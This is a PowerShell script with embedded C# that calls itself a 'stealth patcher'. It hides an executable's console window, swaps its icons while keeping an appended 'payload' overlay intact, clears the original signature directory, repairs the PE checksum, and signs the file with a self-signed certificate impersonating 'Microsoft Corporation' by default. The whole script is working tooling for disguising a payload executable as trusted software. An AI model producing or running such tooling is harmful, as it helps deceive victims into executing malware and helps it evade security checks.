
param(
    [string]$ExePath,
    [string]$IconPath,
    [string]$CompanyName = "Microsoft Corporation"
)

$ErrorActionPreference = "Stop"
$ExePath = (Resolve-Path $ExePath).Path

Write-Host "`n[+] INITIALIZING UNIFIED STEALH PATCHER" -ForegroundColor Cyan

$code = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Collections.Generic;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr BeginUpdateResource(string pFileName, bool bDeleteExistingResources);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateResource(IntPtr hUpdate, IntPtr lpType, IntPtr lpName, ushort wLanguage, byte[] lpData, uint cbData);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);
    [DllImport("imagehlp.dll")]
    public static extern IntPtr MapFileAndCheckSum(string Filename, out uint HeaderSum, out uint CheckSum);

    public static void SetGuiSubsystem(string path) {
        using (var fs = new FileStream(path, FileMode.Open, FileAccess.ReadWrite)) {
            BinaryReader br = new BinaryReader(fs);
            fs.Seek(0x3C, SeekOrigin.Begin);
            int pe = br.ReadInt32();
            fs.Seek(pe + 0x5C, SeekOrigin.Begin);
            fs.WriteByte(2); 
        }
    }

    public static void RemoveIconResources(IntPtr hUpdate) {
        for (ushort i = 1; i < 15; i++) {
             UpdateResource(hUpdate, (IntPtr)14, (IntPtr)i, 1033, null, 0); 
             UpdateResource(hUpdate, (IntPtr)3, (IntPtr)i, 1033, null, 0);  
        }
    }

    public static void InjectIcon(string exe, string ico) {
        if (!File.Exists(ico)) throw new FileNotFoundException("Icon file not found", ico);
        
        byte[] file = File.ReadAllBytes(ico);
        if (file.Length < 22) throw new InvalidDataException("Icon file is too small/invalid header.");

        ushort count = BitConverter.ToUInt16(file, 4);
        if (file.Length < 6 + (count * 16)) throw new InvalidDataException("Icon header declares " + count + " entries, but file is too small.");
        
        IntPtr h = BeginUpdateResource(exe, false);
        if (h == IntPtr.Zero) throw new Exception("Failed to open executable resource handle.");

        List<byte> gDir = new List<byte> { 0, 0, 1, 0 };
        gDir.AddRange(BitConverter.GetBytes(count));
        
        for (int i = 0; i < count; i++) {
            int off = 6 + (i * 16);
            if (off + 16 > file.Length) throw new InvalidDataException("Icon entry " + i + " offset out of bounds.");

            uint sz = BitConverter.ToUInt32(file, off + 8);
            uint imgOff = BitConverter.ToUInt32(file, off + 12);
            
            // Validation: Ensure valid image data range
            if (imgOff + sz > file.Length) {
               Console.WriteLine("[Warning] Skipping Icon " + i + ": Image data out of bounds (Offset: " + imgOff + ", Size: " + sz + ", FileLen: " + file.Length + ")");
               continue; 
            }

            ushort id = (ushort)(i + 1);
            byte[] entry = new byte[14];
            Array.Copy(file, off, entry, 0, 12);
            Array.Copy(BitConverter.GetBytes(id), 0, entry, 12, 2);
            gDir.AddRange(entry);
            
            byte[] img = new byte[sz];
            Array.Copy(file, (int)imgOff, img, 0, (int)sz);
            
            if (!UpdateResource(h, (IntPtr)3, (IntPtr)id, 1033, img, sz)) {
                Console.WriteLine("[Warning] Failed to update resource icon " + id);
            }
        }
        UpdateResource(h, (IntPtr)14, (IntPtr)1, 1033, gDir.ToArray(), (uint)gDir.Count);
        EndUpdateResource(h, false);
    }

    public static void FixSum(string path) {
        uint h, c;
        MapFileAndCheckSum(path, out h, out c);
        using (var fs = new FileStream(path, FileMode.Open, FileAccess.ReadWrite)) {
            BinaryReader br = new BinaryReader(fs);
            fs.Seek(0x3C, SeekOrigin.Begin);
            int pe = br.ReadInt32();
            fs.Seek(pe + 88, SeekOrigin.Begin);
            fs.Write(BitConverter.GetBytes(c), 0, 4);
        }
    }

    public static long[] GetOverlayInfo(string path) {
        using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read)) {
            var br = new BinaryReader(fs);
            fs.Seek(0x3C, SeekOrigin.Begin);
            int pe = br.ReadInt32();
            fs.Seek(pe + 6, SeekOrigin.Begin);
            int n = br.ReadUInt16();
            fs.Seek(pe + 20, SeekOrigin.Begin);
            int szOpt = br.ReadUInt16();
            int tab = pe + 24 + szOpt;
            long maxSec = 0;
            for (int i = 0; i < n; i++) {
                fs.Seek(tab + (i * 40) + 16, SeekOrigin.Begin);
                uint sz = br.ReadUInt32();
                uint ptr = br.ReadUInt32();
                if (ptr + sz > maxSec) maxSec = ptr + sz;
            }
            fs.Seek(pe + 24, SeekOrigin.Begin);
            bool is64 = (br.ReadUInt16() == 0x20b);
            int baseDir = is64 ? 112 : 96;
            fs.Seek(pe + 24 + baseDir + 32, SeekOrigin.Begin);
            uint sAddr = br.ReadUInt32();
            uint sSize = br.ReadUInt32();
            long endSig = maxSec;
            if (sAddr >= maxSec && sSize > 0) endSig = sAddr + sSize;
            return new long[] { maxSec, endSig };
        }
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]"Win32").Type) { Add-Type -TypeDefinition $code -Language CSharp }


Write-Host "[:] Applying mandatory GUI patch..." -ForegroundColor Cyan
[Win32]::SetGuiSubsystem($ExePath)


if ($IconPath -and (Test-Path $IconPath)) {
    Write-Host "[:] Applying Icons and Metadata..." -ForegroundColor Cyan
    
    $Info = [Win32]::GetOverlayInfo($ExePath)
    $EndOfSections = $Info[0]
    $EndOfSignature = $Info[1]
    $PayloadStart = $EndOfSignature

    Write-Host "[:] Detected Payload Start: $PayloadStart" -ForegroundColor DarkGray
    if ($PayloadStart -lt 100000) {
        # Assuming payload is at least 100KB
        Write-Error "CRITICAL: Payload start detection failed (Value too low: $PayloadStart). Aborting to prevent corruption."
        exit 1
    }

    $TmpHead = "$ExePath.header.tmp"
    $SrcStream = [System.IO.File]::OpenRead($ExePath)
    try {
        if ($SrcStream.Length -lt $PayloadStart) {
            Write-Error "CRITICAL: Source file is smaller than detected payload start! (File: $($SrcStream.Length), PayloadStart: $PayloadStart)"
            exit 1
        }

        $HeadBytes = [byte[]]::new($EndOfSections)
        $null = $SrcStream.Read($HeadBytes, 0, $EndOfSections)
        [System.IO.File]::WriteAllBytes($TmpHead, $HeadBytes)
    }
    finally { $SrcStream.Close() }

    $hDel = [Win32]::BeginUpdateResource($TmpHead, $false)
    if ($hDel -eq [IntPtr]::Zero) {
        Write-Error "CRITICAL: Failed to open resource handle for $TmpHead"
        exit 1
    }
    [Win32]::RemoveIconResources($hDel)
    [Win32]::EndUpdateResource($hDel, $false)
    
    try {
        [Win32]::InjectIcon($TmpHead, (Resolve-Path $IconPath).Path)
    }
    catch {
        Write-Warning "ICON INJECTION FAILED: $($_.Exception.Message)"
        Write-Warning "Proceeding without Custom Icon..."
    }
    
    $NewSize = (Get-Item $TmpHead).Length
    if ($NewSize -gt $PayloadStart) {
        $b = [System.IO.File]::ReadAllBytes($TmpHead)
        [System.Array]::Resize([ref]$b, $PayloadStart)
        [System.IO.File]::WriteAllBytes($TmpHead, $b)
    }

    $b = [System.IO.File]::ReadAllBytes($TmpHead)
    $pe = [BitConverter]::ToInt32($b, 0x3C)
    $secOff = if ([BitConverter]::ToUInt16($b, $pe + 24) -eq 0x20b) { 144 } else { 128 }
    [Array]::Clear($b, $pe + 24 + $secOff, 8) 
    [System.IO.File]::WriteAllBytes($TmpHead, $b)

    $OutExe = "$ExePath.patched"
    $OutStream = [System.IO.File]::Create($OutExe)
    $HeadStream = [System.IO.File]::OpenRead($TmpHead)
    $PayloadStream = [System.IO.File]::OpenRead($ExePath)
    try {
        $HeadStream.CopyTo($OutStream)
        if ($OutStream.Position -lt $PayloadStart) {
            $Diff = $PayloadStart - $OutStream.Position
            $pad = [byte[]]::new($Diff)
            $OutStream.Write($pad, 0, $Diff)
        }
        $PayloadStream.Seek($PayloadStart, [System.IO.SeekOrigin]::Begin)
        $PayloadStream.CopyTo($OutStream)
    }
    finally {
        $HeadStream.Close(); $PayloadStream.Close(); $OutStream.Close()
        Remove-Item $TmpHead -Force
    }
    Move-Item $OutExe $ExePath -Force
}

[Win32]::FixSum($ExePath)
Write-Host "[:] Signing binary..." -ForegroundColor Cyan
$cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=$CompanyName" -CertStoreLocation "Cert:\CurrentUser\My" -NotAfter (Get-Date).AddYears(1)
Set-AuthenticodeSignature -FilePath $ExePath -Certificate $cert -HashAlgorithm SHA256 | Out-Null

Write-Host "[OK] Success: Patch applied (GUI + Resources + Signature)." -ForegroundColor Green
